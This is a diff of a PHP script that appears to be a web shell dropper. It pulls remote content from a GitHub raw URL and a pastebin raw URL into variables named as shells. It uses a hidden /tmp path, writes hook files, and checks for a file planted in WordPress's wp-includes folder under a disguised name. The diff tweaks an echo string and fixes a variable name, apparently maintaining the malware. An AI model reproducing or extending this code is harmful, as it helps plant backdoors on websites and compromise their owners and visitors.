@@ -1,5 +1,5 @@
 <?php
-echo('Apache Hecc');
+echo('Apache Hec');
 $curlsh3l = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/hide.txt');
 $curlsh3ll = get_contents('https://pastebin.com/raw/sfgAyVSM');
 $tmpshel = "/tmp/.Test-unix./root";
@@ -406,7 +406,7 @@ if (file_put_contents ($hook54, $hook545));
 /**/
 /**/
 $kupa556 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/feed-rss2-comments.php";
-if (file_exists($kupa55)) { 
+if (file_exists($kupa556)) { 
  }
 else { 
 echo('cekti');
